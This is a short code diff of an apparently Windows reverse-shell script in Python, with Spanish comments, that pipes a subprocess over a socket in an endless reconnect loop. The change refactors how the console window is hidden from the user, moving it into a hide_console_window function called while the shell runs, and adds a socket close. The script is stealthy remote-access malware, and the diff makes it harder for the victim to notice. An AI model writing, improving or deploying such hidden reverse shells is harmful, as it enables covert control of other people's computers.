@@ -1,9 +1,10 @@
 import os, socket, subprocess, threading
-import win32console
+import win32con
 import win32gui
 
-ventana = win32console.GetConsoleWindow()
-win32gui.ShowWindow(ventana, 0)
+def hide_console_window():
+    window = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(window, win32con.SW_HIDE)
 
 def s2p(s, p):
     while True:
@@ -33,8 +34,10 @@ while True:  # Bucle infinito
         p2s_thread.start()
 
         try:
+            hide_console_window()  # Llamamos a la función para ocultar la ventana de la consola
             p.wait()
         except KeyboardInterrupt:
+            s.close()
             pass
 
         s.close()
